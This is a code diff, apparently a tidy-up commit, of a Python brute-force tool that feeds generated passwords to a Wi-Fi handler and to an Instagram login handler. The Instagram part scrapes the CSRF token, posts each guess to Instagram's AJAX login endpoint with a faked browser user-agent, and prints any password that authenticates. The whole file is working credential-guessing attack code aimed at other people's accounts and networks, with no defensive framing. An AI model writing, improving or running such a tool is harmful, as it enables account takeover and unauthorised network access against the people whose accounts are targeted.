@@ -3,11 +3,8 @@ import time
 import string
 import pywifi
 import requests
-
 import re
-import requests
 from bs4 import BeautifulSoup
-
 from datetime import datetime
 
 class GenericHandler:
@@ -42,38 +39,35 @@ class WiFiHandler(GenericHandler):
 
 class InstagramHandler(GenericHandler):
     def handle(self, username, password):
-
         link = 'https://www.instagram.com/accounts/login/'
         login_url = 'https://www.instagram.com/accounts/login/ajax/'
-
-        time = int(datetime.now().timestamp())
+        time_now = int(datetime.now().timestamp())
 
         payload = {
             'username': username,
-            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',  # <-- note the '0' - that means we want to use plain passwords
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}',
             'queryParams': {},
             'optIntoOneTap': 'false'
         }
 
         s = requests.Session()
         r = s.get(link)
-        csrf = re.findall(r"csrf_token\":\"(.*?)\"",r.text)[0]
-        r = s.post(login_url,data=payload,headers={
+        csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
+        r = s.post(login_url, data=payload, headers={
             "user-agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
             "x-requested-with": "XMLHttpRequest",
             "referer": "https://www.instagram.com/accounts/login/",
-            "x-csrftoken":csrf
+            "x-csrftoken": csrf
         })
+
         print(r.status_code)
 
         data = r.json()
 
-  
-        if (data['status'] == 'fail'):
+        if data['status'] == 'fail':
             return False
-        
-        if (data['authenticated'] == True):
-            return True #if we want to keep use session
+        if data['authenticated']:
+            return True
         else:
             return False
 
@@ -113,7 +107,6 @@ class PasswordGenerator:
                 yield password
 
 def main():
-    # Instantiate the PasswordGenerator
     password_generator = PasswordGenerator()
 
     while True:
@@ -127,7 +120,7 @@ def main():
         if choice == "0":
             break
         elif choice == "1":
-            wifi_handler = WiFiHandler(iface=None)  # Pass the appropriate arguments to the constructor
+            wifi_handler = WiFiHandler(iface=None)
             handle_service(WiFiHandler, password_generator)
         elif choice == "2":
             instagram_handler = InstagramHandler()
@@ -149,7 +142,7 @@ def handle_service(handler, password_generator):
     
     if handler == InstagramHandler:
         handler = handler()
-        username= input("Instagram username: ")
+        username = input("Instagram username: ")
         for password in password_generator.generate_password():
             if handler.handle(username=username, password=password):
                 print(f"Correct password found: {password}")
